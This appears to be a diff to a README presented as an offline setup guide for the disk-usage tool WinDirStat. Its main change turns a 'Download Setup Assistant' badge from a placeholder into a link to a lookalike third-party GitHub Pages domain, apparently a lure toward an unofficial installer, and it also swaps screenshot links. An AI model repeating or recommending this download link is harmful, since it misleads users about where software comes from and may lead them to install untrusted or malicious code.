@@ -1,6 +1,6 @@
 # WinDirStat — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://windirstat-desktop.github.io/.github/)
 
 ---
 
@@ -34,14 +34,8 @@ With WinDirStat, users gain complete insight into their storage layout, includin
 
 ## 🖼 Preview
 
-![WinDirStat Main Interface](https://upload.wikimedia.org/wikipedia/commons/6/61/WinDirStat_screenshot.png)  
+![WinDirStat Folder Tree](https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Windirstat.png/1200px-Windirstat.png)  
 *Main dashboard with treemap view and file statistics*
-
-![WinDirStat Folder Tree](https://upload.wikimedia.org/wikipedia/commons/8/8c/WinDirStat_FolderTreeView.png)  
-*Folder structure and file size breakdown*
-
-![Treemap Visualization](https://upload.wikimedia.org/wikipedia/commons/f/fb/WinDirStat_Treemap.png)  
-*Treemap layout showing file types and sizes visually*
 
 ---
 
